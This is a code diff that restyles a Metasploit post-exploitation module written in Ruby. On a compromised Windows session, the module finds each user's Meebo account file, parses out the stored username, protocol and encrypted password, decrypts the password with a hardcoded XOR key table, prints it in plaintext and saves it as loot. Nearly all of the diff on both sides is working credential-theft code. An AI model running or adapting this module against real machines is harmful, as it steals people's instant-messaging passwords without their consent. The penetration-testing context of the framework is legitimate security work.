@@ -39,12 +39,16 @@ class MetasploitModule < Msf::Post
   end
 
   def run
-    grab_user_profiles().each do |user|
-      accounts = user['AppData'] + "\\Meebo\\MeeboAccounts.txt"
-      next if user['AppData'] == nil
+    grab_user_profiles.each do |user|
+      accounts = user['AppData'] + '\\Meebo\\MeeboAccounts.txt'
+      next if user['AppData'].nil?
       next if accounts.empty?
 
-      stat = session.fs.file.stat(accounts) rescue nil
+      stat = begin
+        session.fs.file.stat(accounts)
+      rescue StandardError
+        nil
+      end
       next if stat.nil?
 
       parse_txt(accounts)
@@ -52,61 +56,59 @@ class MetasploitModule < Msf::Post
   end
 
   def parse_txt(file)
-    begin
-      creds = Rex::Text::Table.new(
-        'Header' => 'Meebo Instant Messenger Credentials',
-        'Indent'	=> 1,
-        'Columns' =>
-        [
-          'User',
-          'Password',
-          'Protocol'
-        ]
-      )
+    creds = Rex::Text::Table.new(
+      'Header' => 'Meebo Instant Messenger Credentials',
+      'Indent'	=> 1,
+      'Columns' =>
+      [
+        'User',
+        'Password',
+        'Protocol'
+      ]
+    )
 
-      config = client.fs.file.new(file, 'r')
-      parse = config.read
+    config = client.fs.file.new(file, 'r')
+    parse = config.read
 
-      if (parse =~ /"password.{5}(.*)",\s*"protocol.{4}(\d),\s*"username.{5}(.*)"/)
-        epass = $1
-        protocol = $2.to_i
-        username = $3
-      else
-        print_error("Regex failed...")
-        return
-      end
-
-      protocol = "Meebo" if protocol == 0
-      protocol = "AIM" if protocol == 1
-      protocol = "Yahoo IM" if protocol == 2
-      protocol = "Windows Live" if protocol == 3
-      protocol = "Google Talk" if protocol == 4
-      protocol = "ICQ" if protocol == 5
-      protocol = "Jabber" if protocol == 6
-      protocol = "Myspace IM" if protocol == 7
-
-      passwd = decrypt(epass)
-      print_good("*** Protocol: #{protocol}  User: #{username}  Password: #{passwd}  ***")
-      creds << [username, passwd, protocol]
-      config.close
-
-      if passwd == nil or username == nil
-        print_status("Meebo credentials have not been found")
-      else
-        print_status("Storing data...")
-        path = store_loot(
-          'meebo.user.creds',
-          'text/csv',
-          session,
-          creds.to_csv,
-          'meebo_user_creds.csv',
-          'Meebo Notifier User Credentials'
-        )
-        print_good("Meebo Notifier user credentials saved in: #{path}")
-      end
-    rescue ::Exception => e
-      print_error("An error has occurred: #{e.to_s}")
+    if (parse =~ /"password.{5}(.*)",\s*"protocol.{4}(\d),\s*"username.{5}(.*)"/)
+      epass = ::Regexp.last_match(1)
+      protocol = ::Regexp.last_match(2).to_i
+      username = ::Regexp.last_match(3)
+    else
+      print_error('Regex failed...')
+      return
     end
+
+    protocol = 'Meebo' if protocol == 0
+    protocol = 'AIM' if protocol == 1
+    protocol = 'Yahoo IM' if protocol == 2
+    protocol = 'Windows Live' if protocol == 3
+    protocol = 'Google Talk' if protocol == 4
+    protocol = 'ICQ' if protocol == 5
+    protocol = 'Jabber' if protocol == 6
+    protocol = 'Myspace IM' if protocol == 7
+
+    passwd = decrypt(epass)
+    print_good("*** Protocol: #{protocol}  User: #{username}  Password: #{passwd}  ***")
+    creds << [username, passwd, protocol]
+    config.close
+
+    if passwd.nil? || username.nil?
+      print_status('Meebo credentials have not been found')
+    else
+      print_status('Storing data...')
+      path = store_loot(
+        'meebo.user.creds',
+        'text/csv',
+        session,
+        creds.to_csv,
+        'meebo_user_creds.csv',
+        'Meebo Notifier User Credentials'
+      )
+      print_good("Meebo Notifier user credentials saved in: #{path}")
+    end
+  rescue ::Exception => e
+    print_error("An error has occurred: #{e}")
   end
 
   def decrypt(epass)
@@ -119,12 +121,12 @@ class MetasploitModule < Msf::Post
       152, 63, 137, 2, 40, 84, 131
     ]
 
-    plaintext = [epass].pack("H*").unpack("C*")
+    plaintext = [epass].pack('H*').unpack('C*')
 
     for i in 0..plaintext.length - 1 do
       plaintext[i] ^= magicarr[i]
     end
 
-    return plaintext.pack("C*")
+    return plaintext.pack('C*')
   end
 end
